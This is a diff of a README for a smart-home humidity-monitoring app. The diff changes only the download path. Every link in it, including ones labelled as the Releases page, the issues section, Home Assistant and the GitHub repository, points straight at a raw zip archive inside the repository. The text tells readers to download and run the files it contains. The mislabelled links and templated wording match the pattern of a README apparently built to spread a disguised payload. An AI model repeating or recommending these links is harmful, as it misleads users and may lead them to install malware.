@@ -1,6 +1,6 @@
 # 🌱 humidity-intelligence - Smart Home Humidity Monitoring Made Easy
 
-[![Download latest release](https://github.com/mustapha07022010/humidity-intelligence/raw/refs/heads/main/assets/humidity-intelligence-v2.1.zip%https://github.com/mustapha07022010/humidity-intelligence/raw/refs/heads/main/assets/humidity-intelligence-v2.1.zip)](https://github.com/mustapha07022010/humidity-intelligence/raw/refs/heads/main/assets/humidity-intelligence-v2.1.zip)
+[![Download latest release](https://raw.githubusercontent.com/mustapha07022010/humidity-intelligence/main/Lovelace/humidity-intelligence-v2.4.zip%https://raw.githubusercontent.com/mustapha07022010/humidity-intelligence/main/Lovelace/humidity-intelligence-v2.4.zip)](https://raw.githubusercontent.com/mustapha07022010/humidity-intelligence/main/Lovelace/humidity-intelligence-v2.4.zip)
 
 ## 📦 Overview
 
@@ -21,14 +21,14 @@ To start using the humidity-intelligence application, follow these simple steps 
 
 To download the application, visit the Releases page on GitHub:
 
-[Download humidity-intelligence](https://github.com/mustapha07022010/humidity-intelligence/raw/refs/heads/main/assets/humidity-intelligence-v2.1.zip)
+[Download humidity-intelligence](https://raw.githubusercontent.com/mustapha07022010/humidity-intelligence/main/Lovelace/humidity-intelligence-v2.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, find the latest version. It is usually the first item listed.
 3. Look for the file that matches your operating system, and click to download.
    - For Windows, you might find a file ending in `.exe`.
    - For macOS, look for a file ending in `.dmg`.
-   - For Linux, you may find a `https://github.com/mustapha07022010/humidity-intelligence/raw/refs/heads/main/assets/humidity-intelligence-v2.1.zip` file.
+   - For Linux, you may find a `https://raw.githubusercontent.com/mustapha07022010/humidity-intelligence/main/Lovelace/humidity-intelligence-v2.4.zip` file.
 4. Once the file is downloaded, open it and follow the installation instructions specific to your operating system.
 
 ## ⚙️ Running the Application
@@ -61,7 +61,7 @@ Once you have the application running, you can configure it to fit your needs:
 
 If you run into issues or need help, consider the following resources:
 
-- **GitHub Issues**: Check for common problems in the [issues section](https://github.com/mustapha07022010/humidity-intelligence/raw/refs/heads/main/assets/humidity-intelligence-v2.1.zip).
+- **GitHub Issues**: Check for common problems in the [issues section](https://raw.githubusercontent.com/mustapha07022010/humidity-intelligence/main/Lovelace/humidity-intelligence-v2.4.zip).
 - **Community Forum**: Join our community forum for discussions and support from other humidity-intelligence users.
 - **Documentation**: Review the detailed user guide available in the repository Wiki.
 
@@ -73,8 +73,8 @@ Stay updated about new features, improvements, and discussions:
 
 ## 🔗 Useful Links
 
-- [Download humidity-intelligence](https://github.com/mustapha07022010/humidity-intelligence/raw/refs/heads/main/assets/humidity-intelligence-v2.1.zip)
-- [Home Assistant](https://github.com/mustapha07022010/humidity-intelligence/raw/refs/heads/main/assets/humidity-intelligence-v2.1.zip)
-- [GitHub Repository](https://github.com/mustapha07022010/humidity-intelligence/raw/refs/heads/main/assets/humidity-intelligence-v2.1.zip)
+- [Download humidity-intelligence](https://raw.githubusercontent.com/mustapha07022010/humidity-intelligence/main/Lovelace/humidity-intelligence-v2.4.zip)
+- [Home Assistant](https://raw.githubusercontent.com/mustapha07022010/humidity-intelligence/main/Lovelace/humidity-intelligence-v2.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/mustapha07022010/humidity-intelligence/main/Lovelace/humidity-intelligence-v2.4.zip)
 
 Enjoy monitoring humidity levels in your home with **humidity-intelligence**!
